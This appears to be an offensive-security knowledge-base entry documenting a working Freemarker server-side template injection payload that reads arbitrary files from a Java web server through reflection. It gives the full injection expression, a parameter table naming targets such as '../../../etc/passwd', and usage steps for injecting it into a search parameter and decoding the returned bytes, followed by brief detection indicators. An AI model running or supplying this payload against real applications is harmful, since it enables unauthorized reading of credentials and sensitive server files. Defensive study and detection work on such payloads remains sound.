---
id: 70fd5203-5880-4805-80ef-4498705d8b44
type: code
language: js
verified: true
created_at: '2023-04-06T03:56:39.030447+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
  - Java
tags:
  - ssti
  - freemarker
  - file-read
validated: true
---

# Freemarker-File-Read-Payload

## Code

```js
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
Convert the returned bytes to ASCII
```

## Description

This Freemarker Template Language (FTL) expression exploits SSTI to read arbitrary files from the server by leveraging Java reflection. It accesses the code source location of an accessible object (e.g., 'product'), resolves a relative or absolute path to the target file, opens it as a stream, reads its contents as a byte array, and joins the bytes into a space-separated string for output in the HTTP response. The resulting string requires conversion to ASCII for readability. This payload is injected into user-controlled template inputs to bypass restrictions and access sensitive server files.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| product | Accessible Java object in the template context (e.g., from application model) | product (or user, request, etc., based on app) |
| path_to_the_file | Relative or absolute path to the target file on the server filesystem | ../../../etc/passwd |

## Usage

Inject this payload into a Freemarker-processed input field, such as a search parameter or form value, in a vulnerable web application. For example, append it to a URL query: ?search=${product.getClass()...}. Submit the request and extract the response body, then convert the space-separated byte values to ASCII using a decoder tool. Use in reconnaissance to read configs like application.properties or system files like /proc/version. Ensure the 'product' object is valid in the template scope; probe with simpler expressions like ${product.getClass().getName()} first to confirm.

## Detection

- Web application logs showing anomalous FTL evaluations or Java reflection calls (e.g., getProtectionDomain, openStream).
- WAF alerts on payloads containing Freemarker syntax like ${...} or Java class method chains.
- File access monitoring detecting reads from sensitive paths by the application process.
- Response analysis for unusual space-separated numeric strings that decode to file contents.

## Related

- [[procedures/Freemarker-SSTI-to-Read-Server-Files]]
